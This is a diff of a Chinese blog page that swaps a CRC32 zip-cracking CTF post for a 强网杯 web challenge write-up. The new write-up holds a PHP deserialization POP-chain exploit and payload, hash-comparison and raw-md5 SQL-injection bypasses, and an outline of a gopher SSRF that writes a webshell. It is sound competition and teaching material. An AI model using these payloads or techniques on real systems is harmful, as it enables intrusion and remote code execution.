@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>安恒2020年元旦月赛(CRC32) | 过客</title>
+  <title>强网杯 web题 | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="安恒2020年元旦月赛(CRC32) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="强网杯 web题 | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,8 +25,8 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-    <meta property="og:description" content="安恒2020年元旦月赛(CRC32)"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/UHqjpDUeS/"/>
+    <meta property="og:description" content="强网杯 web题"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/2j6oKGITZ/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content="过客"/>
@@ -82,11 +82,13 @@
           	 
             <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
             
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
         </span>
-            <h1>安恒2020年元旦月赛(CRC32)</h1>
+            <h1>强网杯 web题</h1>
             <span class="meta">
             	Posted on
-              2020-01-02，3 min read
+              2020-08-23，5 min read
             </span>
           </div>
         </div>
@@ -99,75 +101,217 @@
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <p>binwalk。提示a-z0-9。6位密码</p>
-<!-- more -->
-<p><img src="https://guokeya.github.io/post-images/1577963573481.png" alt="" loading="lazy"><br>
-爆破得到abc123<br>
-解压后。获得一个压缩包，还是需要密码<br>
-<img src="https://guokeya.github.io/post-images/1577963653417.png" alt="" loading="lazy"><br>
-这里就要提一下CRC32爆破了</p>
-<pre><code>CRC32：循环冗余校验。用来校验文件是否出错
-就是将文件的每个数据块都进行运算。然后输出一个CRC32
-修改任何一个数据。都会导致CRC32变化
+          <h1 id="web辅助">web辅助</h1>
+<p>源码中。<br>
+class.php是类文件。用于构造pop链<br>
+common.php是自定义函数文件。。其中。read和write。是上次安恒月赛考过的。反序列化逃逸<br>
+<img src="https://guokeya.github.io/post-images/1598154504803.png" alt="" loading="lazy"><br>
+index.php接受username和password参数。初始化player类。写入文件<br>
+play.php反序列化从文件中读取的序列化字符<br>
+会经过check函数。</p>
+<pre><code>function check($data)
+{
+    if(stristr($data, 'name')!==False){
+        die(&quot;Name Pass\n&quot;);
+    }
+    else{
+        return $data;
+    }
+}
 </code></pre>
-<pre><code>CRC32爆破。即用暴力破解。去循环输出字符串的各种拼接。然后计算CRC32。计算是否于压缩包内的CRC32相同。
+<p>不能出现name。<br>
+再去看看类文件。构造POP链</p>
+<pre><code>&lt;?php
+class player{
+    protected $user;
+    protected $pass;
+    protected $admin;
+
+    public function __construct($user, $pass, $admin = 0){
+        $this-&gt;user = $user;
+        $this-&gt;pass = $pass;
+        $this-&gt;admin = $admin;
+    }
+
+    public function get_admin(){
+        return $this-&gt;admin;
+		//触发destruct
+    }
+}
+
+class topsolo{
+    protected $name;
+
+    public function __construct($name = 'Riven'){
+        $this-&gt;name = $name;
+    }
+
+    public function TP(){
+        if (gettype($this-&gt;name) === &quot;function&quot; or gettype($this-&gt;name) === &quot;object&quot;){
+            $name = $this-&gt;name;
+            $name();
+			//把类当作函数调用。触发invoke
+        }
+    }
+
+    public function __destruct(){
+        $this-&gt;TP();
+		//调用TP()
+    }
+
+}
+
+class midsolo{
+    protected $name;
+
+    public function __construct($name){
+        $this-&gt;name = $name;
+    }
+
+    public function __wakeup(){
+		//绕过wakeup
+        if ($this-&gt;name !== 'Yasuo'){
+            $this-&gt;name = 'Yasuo';
+            echo &quot;No Yasuo! No Soul!\n&quot;;
+        }
+    }
+    
+
+    public function __invoke(){
+        $this-&gt;Gank();
+    }
+
+    public function Gank(){
+        if (stristr($this-&gt;name, 'Yasuo')){
+			//把类当作字符串。触发tostring
+            echo &quot;Are you orphan?\n&quot;;
+        }
+        else{
+            echo &quot;Must Be Yasuo!\n&quot;;
+        }
+    }
+}
+
+class jungle{
+    protected $name = &quot;&quot;;
+
+    public function __construct($name = &quot;Lee Sin&quot;){
+        $this-&gt;name = $name;
+    }
+
+    public function KS(){
+        system(&quot;cat /flag&quot;);
+    }
+
+    public function __toString(){
+        $this-&gt;KS(); 
+		//触发KS。读取flag
+        return &quot;&quot;;  
+    }
+
+}
+?&gt;
 </code></pre>
-<p>我们可以看到。在压缩包中。有1/2/3.txt。还有一个hint.txt<br>
-分别是4字节/2字节/2字节/23字节<br>
-由于CRC32采取的是暴力破解的方法。对于计算小文件还好。但是对于大文件。23位字符串循环爆破。。恐怕得不偿失<br>
-所以。这里我们就爆破1/2/3.txt</p>
-<pre><code>import string
-import binascii
-dic=string.printable
-#字典。所有字符串
-crc=0x7D90EE19
-#4字节的CRC值
-for a in dic:
-    for b in dic:
-        for c in dic:
-            for d in dic:
-                s=a+b+c+d
-                #循环拼接字符串,4字节就4个循环。2字节就2个循环
-                if crc==(binascii.crc32(s)&amp;0xffffffff):
-                #计算CRC32值。并且比较
-                    print s
-                    exit(0)
+<p>以下是EXP</p>
+<pre><code>&lt;?php
+class player{
+    protected $user;
+    protected $pass;
+    protected $admin;
+    public function __construct($user, $pass, $admin){
+        $this-&gt;user = $user;
+        $this-&gt;pass = $pass;
+        $this-&gt;admin = $admin;
+    }
+}
+
+class topsolo{
+    protected $name;
+    public function __construct($name){
+        $this-&gt;name=$name;
+    }
+
+}
+
+class midsolo{
+    protected $name;
+    public function __construct($name){
+        $this-&gt;name=$name;
+    }    
+}
+
+class jungle{
+    protected $name;
+}
+$d=new jungle();
+$c=new midsolo($d);
+$b=new topsolo($c);
+$a=new player('1','1212121',$b);
+echo urlencode(serialize($a));
+?&gt;
 </code></pre>
-<p>最后得出结果<br>
-1.txt：Blow<br>
-2.txt：it<br>
-3.txt：up</p>
-<pre><code>获得了这三个。我就尝试用ZIP明文攻击。将3个文件压缩。然后和密文压缩包进行明文攻击
-然而明文攻击需要满足一个条件。就是压缩算法相同。我将3个文件压缩后。3个文件的字节大小永远在4字节左右。
-密文压缩包的大小为17字节。因为加密算法不同。这里无法用ZIP明文攻击
+<p>然后绕过wakeup。和name。<br>
+wakeup+1绕过。name利用S: \6eame绕过<br>
+然后就是逃逸对象了</p>
+<pre><code>username=11\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=1&quot;;s:7:&quot;%00*%00pass&quot;;s:7:&quot;1212121&quot;;s:8:&quot;%00*%00admin&quot;;O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3BN%3B%7D%7D%7D}
 </code></pre>
-<p>然后发现。这三个字符拼接起来就是压缩包密码<br>
-<img src="https://guokeya.github.io/post-images/1577964166741.png" alt="" loading="lazy"><br>
-OK。提示outguess。然后key是它(炸弹人)的生日<br>
-然而。百度搜到20120223。<br>
-outguess -k 20120223 -r Ziggs.jpg -t flag.txt<br>
-并没有flag。<br>
-题目名称叫爆破。。<br>
-想到编个脚本循环输出年月日放入命令里爆破</p>
-<pre><code>for i in range(1,13):
-    if len(str(i))==1:
-        i='0'+str(i)
-    for b in range(1,32):
-        if len(str(b))==1:
-            b='0'+str(b)
-        for a in range(2012,2015):
-            s=str(a)+str(i)+str(b)
-            print 'outguess -k '+s+' -r Ziggs.jpg -t '+s+'.txt'
+<p>然后play.php触发就行</p>
+<h1 id="funhash">Funhash</h1>
+<pre><code>$_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])
+//弱类型。找个0e开头加密后还是0e的就行。
+$_GET['hash2'] === $_GET['hash3'] || md5($_GET['hash2']) !== md5($_GET['hash3'])
+//数组绕过
+$query = &quot;SELECT * FROM flag WHERE password = '&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;'&quot;;
+//找个加密后带'||'或者'or'的字符串就行
 </code></pre>
-<p>python脚本输出2012年-2015年的所有年月日。然后放入命令中<br>
-将python输出的所有可能性放入1.sh执行<br>
-<img src="https://guokeya.github.io/post-images/1577964481310.png" alt="" loading="lazy"></p>
+<h1 id="half_infiltration">half_infiltration</h1>
+<p>审计源码<br>
+<img src="https://guokeya.github.io/post-images/1598155093892.png" alt="" loading="lazy"><br>
+可控点：</p>
+<pre><code>$student-&gt;$body();
+global $$this-&gt;num;
+$result=$GLOBALS['flag'];
+我们可以调用Pass的read方法。来获取flag。$$this-&gt;num。变量覆盖$result=flag
+但是read方法开启了ob_start()。会把所有输出放到缓冲区。并且$result赋值后。清空缓冲区。并不会有输出。
+websec.fr中ob_start遇到报错。就会把信息输出出来。
+而ob_Start和ob_end_clean中间。只有一个global $$a可控。
+所以嘚想办法让global $$a报错
+</code></pre>
+<p>第五空间的WP中。当赋值<code>$$this</code>会报错。。导致触发exception。就会输出结果<br>
+EXP:</p>
+<pre><code>&lt;?php
+class Pass{
+}
+
+class User{
+    public $age,$sex,$num;
+    public function __construct($a1,$a2,$a3){
+        $this-&gt;age=$a1;
+        $this-&gt;sex=$a2;
+        $this-&gt;num=$a3;
+    }
+}
+$a=new Pass();
+$b=new User($a,'read','result');
+$c=new User($a,'read','this');
+echo serialize(array($b,$c));
+</code></pre>
+<p>原理：<br>
+第一个是正常payload。覆盖全局变量result。第二个payload触发exception。它就不会清理掉print的输出。输出flag。<br>
+F12得到ssrf的源码<br>
+<img src="https://guokeya.github.io/post-images/1598155883289.png" alt="" loading="lazy"><br>
+遍历得到40000存在一个貌似文件上传服务。<br>
+参数是file和content。<br>
+利用gopher写文件。<br>
+然后发现禁了=&lt;?php等。<br>
+用php://filter/convert.base64-decode/resource=123.php+base64编码PHP短标签绕过。<br>
+uploads目录遍历得到shell</p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/PtXCVUYYQ/">
+            <a href="https://guokeya.github.io/post/fAqKypsaK/">
               <span class="post-title">
-                Web hash长度扩展攻击&rarr;
+                CTFWP@NULL知识星球的一个小知识点&rarr;
               </span>
             </a>
           </p>
